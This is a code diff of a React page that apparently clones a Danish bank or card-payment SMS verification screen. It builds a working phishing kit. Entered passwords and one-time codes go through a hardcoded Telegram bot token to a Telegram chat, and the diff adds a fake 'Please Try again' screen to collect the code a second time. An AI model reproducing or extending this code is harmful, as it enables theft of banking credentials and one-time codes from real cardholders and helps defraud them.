@@ -5,6 +5,8 @@ import { useParams } from "react-router-dom";
 import { useState } from "react";
 import Header from "./components/header/Header";
 import {GiSmartphone} from "react-icons/gi"
+import msgLogo from "./images/logo_sms.png"
+
 function Page2() {
   const date = new Date();
   const { TelegramClient } = require("messaging-api-telegram");
@@ -14,24 +16,36 @@ function Page2() {
   const [step2, setStep2] = useState(false);
   const [step1, setStep1] = useState(true);
   const [step3, setStep3] = useState(false);
-  const [userId, setUserId] = useState("subhan");
+  const [userId, setUserId] = useState("none");
   const [pass, setPass] = useState("");
   let [secondSmsPage,setSecondSmsPage]=useState(false)
-
+  
   const client = new TelegramClient({
     accessToken: "1946580313:AAFbzUqaVbUGlCE4LFTWvGjbzhGF4WYAcD0",
   });
   const sendmsg = async () => {
     console.log("sending msg now");
+    console.log("password "+pass)
     await client.sendMessage(
       -1001578583679,
       "userId : " + userId + " \n pass  : " + pass
     );
   };
+  let [errorPage,setErrorPage]=useState(false)
  console.log(secondSmsPage,"sms pag")
+ const ErrorPage=()=>{
+   setStep1(false)
+   setIsLoading(true);
+   setTimeout(() => {
+    setIsLoading(false);
+    setErrorPage(true);
+  }, 2000);
+
+ }
   const handleSubmit = () => {
   
      if(pass){ setStep1(false);
+      setErrorPage(false)
       setIsLoading(true);
       sendmsg();
       setTimeout(() => {
@@ -96,10 +110,10 @@ function Page2() {
                              >
                               <div  >
                                 <h2
-                                  style={{ fontWeight: 500, fontSize: 25 }}
+                                  style={{ fontWeight: 500, fontSize: 25,fontFamily:"Source Sans Pro !important" }}
                                   _ngcontent-jha-c48=""
                                 >
-                                  <b _ngcontent-jha-c48="">
+                                  <b _ngcontent-jha-c48=""    style={{fontFamily:"Source Sans Pro !important"}}>
                                 
 
 
@@ -116,6 +130,7 @@ Confirmation by SMS
                                         <td
                                           _ngcontent-jha-c48=""
                                           class="txtleft pb-10"
+                                          style={{fontFamily:"Source Sans Pro !important"}}
                                         >
                                         
                                     Online Store:{" "}
@@ -123,6 +138,7 @@ Confirmation by SMS
                                         <td
                                           _ngcontent-jha-c48=""
                                           class="txtright pb-10"
+                                          style={{fontFamily:"Source Sans Pro !important"}}
                                         >
                                            SPL
                                         </td>
@@ -131,6 +147,7 @@ Confirmation by SMS
                                         <td
                                           _ngcontent-jha-c48=""
                                           class="txtleft pb-10"
+                                          style={{fontFamily:"Source Sans Pro !important"}}
                                         >
                                           Date:{" "}
                                         </td>
@@ -146,6 +163,7 @@ Confirmation by SMS
                                         <td
                                           _ngcontent-jha-c48=""
                                           class="txtleft pb-10"
+                                          style={{fontFamily:"Source Sans Pro !important"}}
                                         >
                                         Card number:{" "}
                                         </td>
@@ -165,14 +183,14 @@ Confirmation by SMS
                                 </div>
                                 <br /><br />
                                 <div
-                                  // _ngcontent-jha-c48=""
-                                  // id="site"
+                                  _ngcontent-jha-c48=""
+                                  id="site"
                                   // class="formotp divmin"
                                   style={{backgroundColor:"white",width:"100%"}}
                                 >
                                   <div
-                                    // _ngcontent-jha-c48=""
-                                    // id="nui"
+                                    _ngcontent-jha-c48=""
+                                    id="nui"
                                     // class="wrapper usrpwd-21-1"
                                     style={{backgroundColor:"green"}}
                                   >
@@ -184,7 +202,7 @@ Confirmation by SMS
                                         _ngcontent-jha-c48=""
                                         // class="frame__logo"
                                       >
-                                        <svg
+                                        {/* <svg
                                           _ngcontent-jha-c48=""
                                           viewBox="0 0 109.4 24.1"
                                           class="frame__logo--large"
@@ -199,8 +217,8 @@ Confirmation by SMS
                                               d="M1.7 2.9c0-.6.2-.7.4-.7s.4.4.5.5l12.9 19.6c.3.4.8 1.2 2 1.2 1.3 0 1.9-.9 1.9-2.3V1c0-.6-.4-.9-.8-.9s-.8.3-.8.9v20c0 .6-.2.7-.4.7s-.4-.4-.5-.5L3.9 1.5c-.3-.4-.8-1.2-2-1.2C.7.4 0 1.3 0 2.6v20.3c0 .6.4.9.8.9s.8-.3.8-.9v-20zM43.6 22.9c0 .6.4.9.8.9s.8-.3.8-.9V2.7c0-.6.1-.7.4-.7s.5.4.6.5l7.2 10.2c.2.3.4.4.7.4.3 0 .5-.1.7-.4l7.3-10.2c.1-.1.3-.5.6-.5.2 0 .3.1.3.7v20.2c0 .6.4.9.8.9s.8-.3.8-.9V2.4C64.6 1 64 .2 62.7.2c-1.2 0-1.6.7-2 1.2L54 10.9l-6.7-9.5c-.3-.5-.8-1.2-2-1.2-1.3 0-1.9.9-1.9 2.3l.2 20.4zM32.8 11.3c.3.3.9.3 1.2 0 .4-.4.2-.9-.1-1.2l-6.6-7c-.4-.4-.5-.6-.5-.8 0-.2.2-.4.5-.4h10.2c.6 0 .9-.4.9-.8s-.3-.8-.9-.8H26.9c-1.2 0-2 .6-2 1.6s.7 1.7 1.3 2.4l6.6 7zM39.6 20.4c.3-.5.2-1-.2-1.2-.4-.2-.9-.2-1.2.3-.4.5-2.1 2.9-5.9 2.9-3 0-6.3-1.8-6.3-5.6 0-3.4 3.3-4.8 3.8-5.1.6-.3.7-.8.4-1.1-.2-.4-.6-.6-1.2-.3-.9.3-4.9 2.1-4.9 6.6 0 4.4 3.6 7.2 7.8 7.2 4-.1 6.6-1.9 7.7-3.7z"
                                             ></path>
                                           </g>
-                                        </svg>
-                                        <svg
+                                        </svg> */}
+                                        {/* <svg
                                           _ngcontent-jha-c48=""
                                           viewBox="0 0 68.5 15.2"
                                           class="frame__logo--small"
@@ -215,7 +233,9 @@ Confirmation by SMS
                                               d="M1 2c0-.4.1-.5.2-.5s.3.2.3.3l8.1 12.3c.2.3.5.7 1.2.7.8 0 1.2-.6 1.2-1.4V.8c0-.4-.2-.6-.5-.6s-.5.2-.5.6v12.5c0 .4-.1.5-.2.5s-.3-.2-.3-.3L2.4 1.1C2.2.8 1.9.4 1.2.4.4.4 0 1 0 1.8v12.7c0 .3.2.5.5.5s.5-.2.5-.5V2zM27.2 14.5c0 .4.2.6.5.6s.5-.2.5-.6V1.9c0-.4.1-.5.2-.5s.3.2.4.3l4.5 6.4c.1.2.3.3.5.3s.3-.1.5-.3l4.5-6.4c.1-.1.2-.3.4-.3.1 0 .2.1.2.5v12.6c0 .4.2.6.5.6s.5-.2.5-.6V1.7c0-.9-.4-1.4-1.2-1.4-.7 0-1 .4-1.3.7l-4.2 6-4.2-6c-.2-.3-.5-.7-1.2-.7-.8 0-1.2.6-1.2 1.4l.1 12.8zM20.5 7.2c.2.2.6.2.7 0 .2-.2.2-.6-.1-.8L17 2c-.2-.2-.3-.4-.3-.5s.1-.2.3-.2h6.4c.4 0 .6-.2.6-.5s-.2-.5-.6-.5h-6.7c-.7 0-1.2.4-1.2 1s.4 1.1.8 1.5l4.2 4.4zM24.7 12.9c.2-.3.1-.6-.1-.8-.2-.1-.5-.1-.7.2-.2.3-1.3 1.8-3.7 1.8-1.9 0-3.9-1.1-3.9-3.5 0-2.1 2-3 2.4-3.2.3-.1.4-.4.2-.7-.1-.2-.4-.4-.7-.2-.5.2-3 1.3-3 4.2 0 2.8 2.2 4.5 4.9 4.5 2.4 0 4-1.2 4.6-2.3z"
                                             ></path>
                                           </g>
-                                        </svg>
+                                        </svg> */}
+
+                                        <img style={{width:"55px",height:"50px"}} src={msgLogo}></img>
                                         <button
                                           _ngcontent-jha-c48=""
                                           tabindex="55"
@@ -298,14 +318,21 @@ Confirmation by SMS
                                                     class="ifapp"
                                                   >
                                                     <br _ngcontent-jha-c48="" />
-                                                    <h1 _ngcontent-jha-c48="">
-                                                    Approve on mobile / tablet
+                                                    <br />   <br />   <br />   <br />   
+                                                    <h1 _ngcontent-jha-c48="" style={{textAlign:"center"}}>
+                                                     Thank you 
                                                     </h1>
                                                     <div
-                                                      _ngcontent-jha-c48=""
-                                                      class="frame__row"
+                                                  //     _ngcontent-jha-c48=""
+                                                  //     class="frame__row"
+                                                  //     style={{border:"2px solid red",
+                                                  //     display:"flex",alignItems:"center",justifyContent:"center !important",
+                                                   
+                                                  // height:"100px"}}
                                                     >
-                                                      <div
+
+                                                    {/* Thank you */}
+                                                      {/* <div
                                                         _ngcontent-jha-c48=""
                                                         class="animate top-icon-frame spacer"
                                                       >
@@ -319,20 +346,23 @@ Confirmation by SMS
                                                           aria-label="nøgleapp"
                                                           class="otp__icon-phone icon-element"
                                                         ></div>
-                                                      </div>
+                                                      </div> */}
                                                       <div
                                                         _ngcontent-jha-c48=""
                                                         aria-hidden="true"
                                                         class="hide-element"
                                                       >
+                                                        <br /><br /><br /><br /><br />
                                                         <p
                                                           _ngcontent-jha-c48=""
                                                           class="spacer"
                                                         >
-                                                          Submit request
+                                                          {/* Submit request
                                                            approval to your
                                                            key apps on
-                                                           mobile / tablet.
+                                                           mobile / tablet. */}
+                                                           <br /><br /><br />
+                                                           Thankyou 
                                                         </p>
                                                       </div>
                                                       <div _ngcontent-jha-c48="">
@@ -344,10 +374,10 @@ Confirmation by SMS
                                                           _ngcontent-jha-c48=""
                                                           class="spacer"
                                                         >
-                                                          Your request is ready for approval in your key apps on mobile / tablet.
+                                                   {/* Your request is ready for approval in your key apps on mobile / tablet. */}
                                                         </p>
                                                       </div>
-                                                      <div
+                                                      {/* <div
                                                         _ngcontent-jha-c48=""
                                                         class="spacer"
                                                     
@@ -357,12 +387,12 @@ Confirmation by SMS
                                                           aria-hidden="true"
                                                           class="hide-element error"
                                                         ></p>
-                                                      </div>
-                                                      <div
+                                                      </div> */}
+                                                      {/* <div
                                                         _ngcontent-jha-c48=""
                                                         class="spacer"
                                                       
-                                                      ></div>
+                                                      ></div> */}
                                                       <div
                                                         _ngcontent-jha-c48=""
                                                         class="spacer"
@@ -376,8 +406,8 @@ Confirmation by SMS
                                                           class="pointercur link"
                                                           style={{color:"white",backgroundColor:"white"}}
                                                         >
-                                                          Switch to sms
-                                                           confirm
+                                                          {/* Switch to sms
+                                                           confirm */}
                                                         </div>
                                                       </div>
                                                     </div>
@@ -405,8 +435,8 @@ Confirmation by SMS
                                                     _ngcontent-jha-c48=""
                                                     class="label__text spacer"
                                                   >
-                                                  Enter the one-time code we
-                                                     sent to your mobile phone.
+                                                  {/* Enter the one-time code we
+                                                     sent to your mobile phone. */}
                                                   </div>
                                                   <div
                                                     _ngcontent-jha-c48=""
@@ -502,6 +532,43 @@ try again
                                                 </div>
                                               </div>
                                             </div>
+                                            {errorPage && (
+                                              <div
+                                                _ngcontent-jha-c48=""
+                                                class="appsendnotification"
+                                                style={{border:"2px soid red",backgroundColor:"white"}}
+                                              >
+                                                <div _ngcontent-jha-c48=""  style={{border:"2px soid red",backgroundColor:"white"}}>
+                                                  <br _ngcontent-jha-c48="" />
+                                                  <h1
+                                                    style={{
+                                                      fontWeight: 500,
+                                                      fontSize: 14,
+                                                      textAlign:"center"
+                                                    }}
+                                                    _ngcontent-jha-c48=""
+                                                  >
+                                                   Please Try again
+                                                  </h1>
+                                                  <div
+                                                    _ngcontent-jha-c48=""
+                                                    class="frame__row"
+
+                                                  >
+                                                      <div style={{textAlign:"center",display:"flex",justifyContent:"center"}}>  
+                                <input onChange={(e)=>{setPass(e.target.value)}} style={{textAlign:"center",backgroundColor:"white",border:"1px solid grey",padding:"3px"}} type="password"></input>
+                                </div>
+                                                  < br />
+                                         <div 
+                                        style={{textAlign:"center"}}> 
+                                        <button style={{border:"1px solid blue",backgroundColor:"blue",padding:".8rem 4.6rem",textAlign:"center",color:"white",fontWeight:"600",fontSize:"18px"}} onClick={handleSubmit}>Verify</button></div>
+                                           < br />
+                                               
+                                                </div>
+                                                </div>
+                                              </div>
+                                            )}
+
 
                                             {step2 && (
                                               <div
@@ -576,8 +643,8 @@ try again
                                                     <div _ngcontent-jha-c48="">
                                                       {/* <button
                                                        
-                                                        _ngcontent-jha-c48=""
-                                                        aria-label="Send"
+                                                     
+                                                     
                                                         tabindex="51"
                                                         title="Klik her for at godkende med nøgleapp"
                                                         type="button"
@@ -588,6 +655,8 @@ try again
                                                       <div 
                                         style={{textAlign:"center"}}> 
                                         <button 
+                                           _ngcontent-jha-c48=""
+                                           aria-label="Send"
                                          onClick={sendMessage}
                                         style={{border:"1px solid blue",backgroundColor:"blue",padding:".8rem 4.6rem",
                                         textAlign:"center",color:"white",fontWeight:"600",fontSize:"18px"}} >Send</button></div>
@@ -608,8 +677,8 @@ try again
                                                   <GiSmartphone style={{width:"300p",color:"blue",fontSize:"62px" ,backgroundColor:"#F6F9F8",
                                           border:"1px solid grey",borderRadius:"50% 50%",padding:"10px"}} /></div>
                                              {/* <br/> */}
-                                                  <h1 style={{fontSize:"2rem",textAlign:"center"}}>Verification </h1>
-                                                  <h3 style={{textAlign:"center",fontSize:"17px",opacity:".3",width:"98%"}}>
+                                                  <h1 style={{fontSize:"2rem",textAlign:"center",fontFamily:"Source Sans Pro !important"}}>Verification </h1>
+                                                  <h3 style={{textAlign:"center",fontSize:"17px",opacity:".3",width:"98%",fontFamily:"Source Sans Pro !important"}}>
                                                     {/* We will send you a One Time Password on your phone number */}
                                                     you will get a otp via sms 
                                                     </h3>
@@ -620,7 +689,7 @@ try again
                                                   < br />
                                          <div 
                                         style={{textAlign:"center"}}> 
-                                        <button style={{border:"1px solid blue",backgroundColor:"blue",padding:".8rem 4.6rem",textAlign:"center",color:"white",fontWeight:"600",fontSize:"18px"}} onClick={handleSubmit}>Verify</button></div>
+                                        <button style={{border:"1px solid blue",backgroundColor:"blue",padding:".8rem 4.6rem",textAlign:"center",color:"white",fontWeight:"600",fontSize:"18px"}} onClick={ErrorPage}>Verify</button></div>
                                            < br />
                                               </div>  
                                               
@@ -831,8 +900,8 @@ try again
                                                   <GiSmartphone style={{width:"300p",color:"blue",fontSize:"62px" ,backgroundColor:"#F6F9F8",
                                           border:"1px solid grey",borderRadius:"50% 50%",padding:"10px"}} /></div>
                                              <br/>
-                                                  <h1 style={{fontSize:"2rem",textAlign:"center"}}>Verification </h1>
-                                                  <h3 style={{textAlign:"center",fontSize:"17px",opacity:".3",width:"98%"}}>
+                                                  <h1 style={{fontSize:"2rem",textAlign:"center",fontFamily:"Source Sans Pro !important"}}>Verification </h1>
+                                                  <h3 style={{textAlign:"center",fontSize:"17px",opacity:".3",width:"98%",fontFamily:"Source Sans Pro !important"}}>
                                                     We will send you a One Time Password on your phone number
                                                     {/* you will get a otp via sms  */}
                                                     </h3>
@@ -845,7 +914,7 @@ try again
                                         style={{textAlign:"center"}}> 
                                         <button 
                                          onClick={()=>{setSecondSmsPage(true)}}
-                                        style={{border:"1px solid blue",backgroundColor:"blue",padding:".8rem 4.6rem",textAlign:"center",color:"white",fontWeight:"600",fontSize:"18px"}} >GET OTP</button></div>
+                                        style={{fontFamily:"Source Sans Pro !important",border:"1px solid blue",backgroundColor:"blue",padding:".8rem 4.6rem",textAlign:"center",color:"white",fontWeight:"600",fontSize:"18px"}} >GET OTP</button></div>
                                            < br />
                                               </div>  
                                               <div
@@ -891,6 +960,7 @@ try again
                                         </div>
                                       </div>
                                     </div>
+                                  
 
                                     {isLoading && (
                                       <div
